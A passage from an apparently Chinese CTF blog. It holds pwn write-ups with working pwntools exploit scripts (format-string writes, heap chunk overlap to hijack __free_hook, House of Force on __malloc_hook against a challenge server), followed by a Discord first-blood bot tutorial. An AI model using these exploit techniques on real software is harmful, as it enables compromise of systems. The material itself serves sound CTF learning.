class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">afterarrow</span>(<span class="params">con</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name,num</span>):</span><br><span class="line">    afterarrow(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Enter your player name: &#x27;</span>,name)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Enter your player id number: &#x27;</span>,<span class="built_in">str</span>(num))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Select your player class: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    afterarrow(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play</span>():</span><br><span class="line">    afterarrow(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    cmd =<span class="string">&quot;&quot;</span></span><br><span class="line">    cmd +=<span class="string">&quot;brva 0x154F\n&quot;</span> <span class="comment"># printf</span></span><br><span class="line">    cmd +=<span class="string">&quot;brva 0x14E6\n&quot;</span> <span class="comment"># get boss</span></span><br><span class="line">    <span class="comment"># cmd +=&quot;brva 0x14D4\n&quot; # show</span></span><br><span class="line">    <span class="comment"># cmd +=&quot;brva 0x1595\n&quot;</span></span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line">    <span class="comment"># show()</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">fmt = <span class="string">&quot;%25$p...%7$p&quot;</span></span><br><span class="line">add(fmt,<span class="number">0</span>)</span><br><span class="line">show()</span><br><span class="line">heap_info = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;...&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">heap_base = heap_info - <span class="number">0x0040a0</span></span><br><span class="line">success(<span class="string">&quot;heap_base: &quot;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line">stack_info = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;stack_info: &quot;</span> + <span class="built_in">hex</span>(stack_info))</span><br><span class="line">change_place = stack_info - <span class="number">44</span> + <span class="number">3</span> <span class="comment"># onlu write a byte + 3</span></span><br><span class="line">boss_place = stack_info - <span class="number">44</span>+<span class="number">4</span></span><br><span class="line">success(<span class="string">&quot;change_place: &quot;</span> + <span class="built_in">hex</span>(change_place))</span><br><span class="line">boss = heap_base + <span class="number">0x40a0</span></span><br><span class="line">success(<span class="string">&quot;boss: &quot;</span> + <span class="built_in">hex</span>(boss))</span><br><span class="line">fmt2 = fmtstr_payload(offset,&#123;boss:<span class="number">0x61</span>&#125;)</span><br><span class="line"></span><br><span class="line">add(fmt2,<span class="number">1</span>)</span><br><span class="line">show() <span class="comment"># change boss&#x27;s content</span></span><br><span class="line"></span><br><span class="line">fmt3 = fmtstr_payload(offset,&#123;change_place:<span class="number">0xFF</span>&#125;,write_size=<span class="string">&#x27;byte&#x27;</span>)</span><br><span class="line">fmt3 = fmt3.replace(<span class="string">b&#x27;lln&#x27;</span>,<span class="string">b&#x27;hhn&#x27;</span>)</span><br><span class="line">add(fmt3,<span class="number">0xfffc18</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># add(fmt3,0xFFFFC18)# above zero</span></span><br><span class="line"><span class="comment"># show()</span></span><br><span class="line">play()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Rings-of-Saturn"><a href="#Rings-of-Saturn" class="headerlink" title="Rings of Saturn"></a>Rings of Saturn</h2><p>这个题目比赛的时候没做出来，赛后复现出来的。</p><p>先看看逆出来的结构体。这道题逆起来还是有点麻烦。idb文件我也放在上面的链接中了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> ringbuf         struc ; (<span class="keyword">sizeof</span>=<span class="number">0x1A</span>, mappedto_8)</span><br><span class="line"><span class="number">00000000</span> data_ptr        dq ?</span><br><span class="line"><span class="number">00000008</span> next            dq ?</span><br><span class="line"><span class="number">00000010</span> size            dq ?</span><br><span class="line"><span class="number">00000018</span> data            dw ?</span><br><span class="line"><span class="number">0000001</span>A ringbuf         ends</span><br><span class="line"><span class="number">0000001</span>A</span><br><span class="line"><span class="number">00000000</span> ; ---------------------------------------------------------------------------</span><br><span class="line"><span class="number">00000000</span></span><br><span class="line"><span class="number">00000000</span> head            struc ; (<span class="keyword">sizeof</span>=<span class="number">0x20</span>, mappedto_9)</span><br><span class="line"><span class="number">00000000</span> ptr_head        dq ?</span><br><span class="line"><span class="number">00000008</span> tail            dq ?                    ; offset</span><br><span class="line"><span class="number">00000010</span> start           dq ?                    ; offset</span><br><span class="line"><span class="number">00000018</span> size_all        dq ?                    ; seg</span><br><span class="line"><span class="number">00000020</span> head            ends</span><br></pre></td></tr></table></figure><p>主要是head作为链表尾指针，ringbuf作为链表每个节点，构成的环形链表。</p><p>比赛的时候我重点看了write部分和delet部分，这两个部分真的是完全没有漏洞，，于是后来就放弃了。赛后看了别的师傅的wp才发现漏洞点在于下面buf_init阶段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">remain = (ringbuf *)<span class="built_in">calloc</span>(((size - total_size + <span class="number">15</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFF0</span>LL) + <span class="number">8</span>, <span class="number">1uLL</span>);<span class="comment">// 剩下大小构成一个ringbuf</span></span><br><span class="line">remain-&gt;size = size - total_size;</span><br></pre></td></tr></table></figure><p>如果我们输入size=1000，那么remain的结果是</p><p><code>(1000-0+15)&amp;0xffffffffffffff0+8</code>，也就是0x3f8。这个将被写在<code>remain-&gt;size</code>的地方，也就是我们能写的长度。这将导致我们能够覆盖下一个chunk的size。因此后面直接改掉后面chunk的size构造chunk overlpping就可以了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename=<span class="string">&quot;./rings_of_saturn&quot;</span></span><br><span class="line">libc_name=<span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line">io = process(filename)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">libc=ELF(libc_name)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="comment"># for i in range(0,1):</span></span><br><span class="line"><span class="comment">#     io.sendlineafter(&#x27;&gt; &#x27;,&#x27;1000&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">afterarrow</span>(<span class="params">content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    <span class="keyword">global</span> index</span><br><span class="line">    afterarrow(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    afterarrow(<span class="built_in">str</span>(size))</span><br><span class="line">    index+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> index</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">index</span>):</span><br><span class="line">    afterarrow(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    afterarrow(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print</span>(<span class="params">index</span>):</span><br><span class="line">    afterarrow(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    afterarrow(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">size,content</span>):</span><br><span class="line">    afterarrow(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    afterarrow(<span class="built_in">str</span>(size))</span><br><span class="line">    afterarrow(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    cmd =<span class="string">&quot;&quot;</span></span><br><span class="line">    cmd +=<span class="string">&quot;b *0x0400C1E\n&quot;</span> <span class="comment"># b print</span></span><br><span class="line">    cmd +=<span class="string">&quot;b *0x400D48\n&quot;</span> <span class="comment"># b read</span></span><br><span class="line">    cmd +=<span class="string">&quot;b *0x400C17\n&quot;</span> <span class="comment"># b free</span></span><br><span class="line">    <span class="comment"># cmd +=&quot;b *0x400BBE\n&quot;</span></span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line">    <span class="comment"># print(0)</span></span><br><span class="line"></span><br><span class="line">og = [<span class="number">0x4f365</span>,<span class="number">0x4f3c2</span>,<span class="number">0x10a45c</span>]</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;lol &#x27;</span>)</span><br><span class="line">leak_value = <span class="built_in">int</span>(io.recvline(),<span class="number">16</span>)</span><br><span class="line">libc_base = leak_value - libc.symbols[<span class="string">&#x27;exit&#x27;</span>] - <span class="number">0xc195</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;1000&#x27;</span>)</span><br><span class="line"></span><br><span class="line">chk1 = add(<span class="number">1000</span>)</span><br><span class="line">chk2 = add(<span class="number">1000</span>)</span><br><span class="line">chk3 = add(<span class="number">1000</span>)</span><br><span class="line">chk4 = add(<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">remove(chk3) <span class="comment"># into tcache</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">write(<span class="number">1000</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">992</span>+p64(<span class="number">0x410</span>+<span class="number">0x410</span>+<span class="number">1</span>)) <span class="comment"># change next chunk&#x27;s size</span></span><br><span class="line">remove(chk1) <span class="comment"># after the initial one, create overlap</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">giant = add(<span class="number">0x820</span>-<span class="number">8</span>-<span class="number">24</span>) <span class="comment"># add in the tail</span></span><br><span class="line">success(<span class="string">&quot;chk2: &quot;</span> + <span class="built_in">hex</span>(chk2))</span><br><span class="line">success(<span class="string">&quot;giant: &quot;</span> + <span class="built_in">str</span>(giant))</span><br><span class="line">remove(<span class="number">1</span>) <span class="comment"># now chunk2 is both in bins and in the last chunk</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">write(<span class="number">1000</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">1000</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*(<span class="number">1000</span>-<span class="number">8</span>)+p64(<span class="number">0xdeabeef</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x411</span>)+p64(libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]-<span class="number">0x50</span>)</span><br><span class="line">write(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment"># debug() # hijacked mem before free_hook</span></span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">fake2 = add(<span class="number">1000</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">add(<span class="number">1000</span>) <span class="comment"># get mem before freehook</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">remove(giant)</span><br><span class="line">remove(chk4)</span><br><span class="line">remove(fake2)</span><br><span class="line">write(<span class="number">1000</span>,<span class="string">b&quot;a&quot;</span>*(<span class="number">1000</span>-<span class="number">8</span>)+p64(<span class="number">0xdeadcafe</span>))</span><br><span class="line">write(<span class="number">56</span>,p64(<span class="number">0</span>)*<span class="number">7</span>)</span><br><span class="line">write(<span class="number">8</span>,p64(libc_base+og[<span class="number">1</span>]))</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io.clean()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="Use-the-Force-Luke"><a href="#Use-the-Force-Luke" class="headerlink" title="Use the Force, Luke"></a>Use the Force, Luke</h2><p>house of force,改malloc_hook到system,读一个/bin/sh的地址</p><blockquote><p>shctf{st4r_w4rs_1s_pr3tty_0v3rr4t3d}</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"><span class="keyword">from</span> turtle <span class="keyword">import</span> onclick</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-hp&#x27;</span>, <span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./force&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&quot;0.cloud.chals.io&quot;</span>,<span class="number">11996</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;You feel a system at &#x27;</span>)</span><br><span class="line">system_addr = <span class="built_in">int</span>(io.recv(<span class="number">14</span>)[<span class="number">2</span>:],<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;system_addr : &quot;</span>+ <span class="built_in">str</span>(<span class="built_in">hex</span>(system_addr)))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;You feel something else at &#x27;</span>)</span><br><span class="line">chunk_addr = <span class="built_in">int</span>(io.recv(<span class="number">9</span>)[<span class="number">2</span>:],<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;chunk_addr : &quot;</span>+ <span class="built_in">str</span>(<span class="built_in">hex</span>(chunk_addr)))</span><br><span class="line">libc_base = system_addr - <span class="number">0x41b70</span></span><br><span class="line">libc.address = libc_base</span><br><span class="line">log.info(<span class="string">&quot;libc_base_addr : &quot;</span>+ <span class="built_in">str</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset = libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] - chunk_addr - <span class="number">60</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;offset : &quot;</span>+ <span class="built_in">str</span>((offset)))</span><br><span class="line">log.info(<span class="string">&quot;malloc hook:&quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>])))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;(2) Surrender\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;How many midi-chlorians?:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;10&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;What do you feel?:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x18</span> + p64(<span class="number">0xffffffffffffffff</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;(2) Surrender\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;How many midi-chlorians?:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(offset))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;What do you feel?:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;(2) Surrender\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;How many midi-chlorians?:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">10</span>))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;What do you feel?:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(p64(system_addr))</span><br><span class="line"></span><br><span class="line">sh_addr = <span class="number">0x0000000000177375</span> + libc_base</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;(2) Surrender\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;How many midi-chlorians?:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(sh_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>一次简单的比赛！松神AK逆向，松神太强了！(我没做出来rings of sarurn真是太菜了)</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> heap </tag>
            
            <tag> stack </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fb-bot_discord</title>
      <link href="/2022/04/01/fb-bot-discord/"/>
      <url>/2022/04/01/fb-bot-discord/</url>
      
        <content type="html"><![CDATA[<p>xctf的一血机器人播报，内含源码。</p><span id="more"></span><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="初始化bot"><a href="#初始化bot" class="headerlink" title="初始化bot"></a>初始化bot</h2><p>首先需要创建一个机器人，在<a href="https://discord.com/developers/applications">这个网站</a>注册一个账号，之后在应用这里注册一个机器人</p><p><img src="/2022/04/01/fb-bot-discord/image-20220401215407780.png" alt="image-20220401215407780"></p><p>我这里命名为bot_test。点开之后，点击左边的bot，点击add_bot</p><p><img src="/2022/04/01/fb-bot-discord/image-20220401215626646.png" alt="image-20220401215626646"></p><p>点击生成一个token。如下图。这个token是<strong>在本地控制机器人的唯一方式</strong>。因此千万不能泄露。</p><p><img src="/2022/04/01/fb-bot-discord/image-20220401215752532.png" alt="image-20220401215752532"></p><p>之后点击左边的OAUTH2。选择下面的选项。这里的选项是bot的权限。按照自己的需要添加就行。</p><p><img src="/2022/04/01/fb-bot-discord/image-20220401220007265.png" alt="image-20220401220007265"></p><p>比如作为一个fb-bot可能只要选择这些就可以了。接着我们点这里的copy。吧URL复制到浏览器里面并点击。</p><p><img src="/2022/04/01/fb-bot-discord/image-20220401220227350.png" alt="image-20220401220227350"></p><p>可以看到它让我们选择一个服务器。这个服务器就是我们作为管理员所在的服务器。</p><p><img src="/2022/04/01/fb-bot-discord/image-20220401220333083.png" alt="image-20220401220333083"></p><h2 id="本地构建bot环境"><a href="#本地构建bot环境" class="headerlink" title="本地构建bot环境"></a>本地构建bot环境</h2><p>这里需要介绍一些discord的API。以及一些需要安装的库。最好把下面这些都装了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> aiohttp.client <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> discord</span><br><span class="line"><span class="keyword">from</span> aiohttp_socks <span class="keyword">import</span> ProxyConnector </span><br><span class="line"><span class="keyword">from</span> discord.ext <span class="keyword">import</span> tasks, commands</span><br><span class="line"><span class="keyword">from</span> discord.ext.commands <span class="keyword">import</span> Bot</span><br><span class="line"><span class="keyword">from</span> discord <span class="keyword">import</span> utils</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> sessions</span><br><span class="line"><span class="keyword">import</span> json</span><br></pre></td></tr></table></figure><p>其次，需要一个VPN。我这里用的是clash。直接用他的默认端口7890就可以了。注意,clash默认打开的时候不会开启socks5端口。我们需要按照以下步骤操作：</p><ol><li>打开clash</li></ol><p><img src="/2022/04/01/fb-bot-discord/image-20220401220827552.png" alt="image-20220401220827552"></p><ol start="2"><li>进入windows Internet属性这里，修改如下所示的<strong>套接字</strong>部分。这里要保持安全这里写空，不然不知道为什么xctf的SSL验证无法通过(真是糟心…)</li></ol><p><img src="/2022/04/01/fb-bot-discord/image-20220401231447090.png" alt="image-20220401231447090"></p><p>之后就可以了。注意不能把上面两步倒过来，因为clash打开的时候会默认重置上面我们添加的内容。</p><h1 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> aiohttp.client <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> discord</span><br><span class="line"><span class="keyword">from</span> aiohttp_socks <span class="keyword">import</span> ProxyConnector </span><br><span class="line"><span class="keyword">from</span> discord.ext <span class="keyword">import</span> tasks, commands</span><br><span class="line"><span class="keyword">from</span> discord.ext.commands <span class="keyword">import</span> Bot</span><br><span class="line"><span class="keyword">from</span> discord <span class="keyword">import</span> utils</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> sessions</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意bot必须通过这个协议，不知道为什么。按照上面的做就行了。</span></span><br><span class="line">bot = Bot(<span class="string">&quot;!&quot;</span>, connector =ProxyConnector.from_url(<span class="string">&#x27;socks5://127.0.0.1:7890&#x27;</span>))</span><br><span class="line">TOKEN = <span class="string">&quot;上面基础知识拿到的token&quot;</span></span><br><span class="line"><span class="comment"># 下面这五个怎么拿到会在代码后面写</span></span><br><span class="line">MY_GUILD=<span class="number">959118584083279952</span></span><br><span class="line">MY_CHANNEL=<span class="number">959118584083279954</span></span><br><span class="line">XCTF_GUILD=<span class="number">941157903128223805</span></span><br><span class="line">XCTF_TEST_CHANNEL=<span class="number">941200329968603187</span></span><br><span class="line">XCTF_REAL_CHANNEL=<span class="number">941198787580412005</span> <span class="comment"># announcement</span></span><br><span class="line"><span class="meta">@bot.event</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">on_ready</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;We have logged in as &#123;0.user&#125;&#x27;</span>.<span class="built_in">format</span>(bot))</span><br><span class="line">    <span class="keyword">await</span> bot.get_channel(XCTF_TEST_CHANNEL).send(<span class="string">&quot;Bot is online&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyCog</span>(commands.Cog):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, bot, index</span>):</span><br><span class="line">        self.index = index</span><br><span class="line">        self.bot = bot</span><br><span class="line">        self.first_blood.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">cog_unload</span>(<span class="params">self</span>):</span><br><span class="line">        self.first_blood.cancel()</span><br><span class="line"><span class="comment"># 下面的seconds是每隔多久时间访问xctf来更新一血列表</span></span><br><span class="line"><span class="meta">    